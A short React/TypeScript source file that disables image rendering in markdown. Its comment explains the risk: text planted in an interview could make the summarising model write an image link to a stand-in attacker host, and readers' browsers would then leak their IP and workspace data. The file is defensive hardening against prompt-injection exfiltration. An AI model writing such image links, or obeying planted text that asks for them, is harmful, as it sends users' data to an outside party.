import type { Components } from "react-markdown";

/**
 * Markdown images are never loaded (docs/security-hardening-task-list.md, D6).
 * Summaries, recommendations and AskFabric answers are written by a model from
 * contributor speech, so text planted in an interview could make it write
 * `![](https://evil.example/?q=…)`; every reader's browser would then fetch
 * that URL, leaking their IP, the workspace and whatever the model put in it.
 * None of Fabric's own content uses images, so the alt text is shown instead.
 */
export const noImages: Components = {
  img: ({ alt }) => (alt ? <span>{alt}</span> : null),
};
